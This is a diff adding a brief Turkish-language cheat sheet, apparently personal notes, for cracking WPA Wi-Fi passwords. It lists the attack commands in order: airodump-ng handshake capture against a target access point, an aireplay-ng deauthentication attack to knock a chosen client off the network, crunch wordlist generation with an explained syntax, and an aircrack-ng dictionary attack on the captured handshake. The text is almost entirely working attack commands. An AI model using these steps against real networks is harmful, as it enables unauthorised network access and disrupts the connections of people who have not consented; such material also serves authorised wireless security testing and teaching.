@@ -1,0 +1,25 @@
+---------------WPA CRACK-----------------
+NOT: Bizim wpa ile crack yapabilmemiz icin handshake denilen bir olay yapmamiz lazim. Airodump-ng de handshakeleri yeni bir kullanici katilirsa yakalayabilir. kullanicilardan birine deauth saldirisi yapariz
+
+-----------------------------------------(((1)))
+1- monitor moda gec
+2- airodump-ng ile wifi modem listesinden hedef modemi sec sonra
+3- airodump-ng --bssid *Modemin bssid* --channel *ch nmb* --write handshake-file wlan0
+-----------------------------------------
+
+-----------deauth------------------------(((2))) New terminalde
+aireplay-ng --deauth 5 -a *hedef modemin maci* -c *hedef kisinin maci* wlan0
+-----------------------------------------
+
+---------CRUNCH Framework---------------(((3))) 
+ornek: crunch 8 9 xy123 !*?. -o testwordlist
+Aciklama: Bu framework muhtemel sifreleri olusturan bir algoritma
+** bastaki 8 9 = sifrenin min 8 karakterli max 9 karakterli oldugunu tahmin ediyoruz
+** xy123= hangi karakterlerin kullanildigini dusunuyorsak buraya onu gireriz
+** !*?. = hangi sembollerin kullanildigini dusunuyorsak buraya onu gireriz eger boyle kompleks bir sifre olmadigini dusunuyorsak bu bolumu bos geceriz
+** -o testwordlist = testwordlist isimli bir dosya olusturur bu algoritma bilgilerini oranin icine atar.
+-----------------------------------------
+
+----------------------------------------(((4)))
+aircrack-ng handshake-file.cap(dosya ismini roottan kontrol et) -w testwordlist
+----------------------------------------
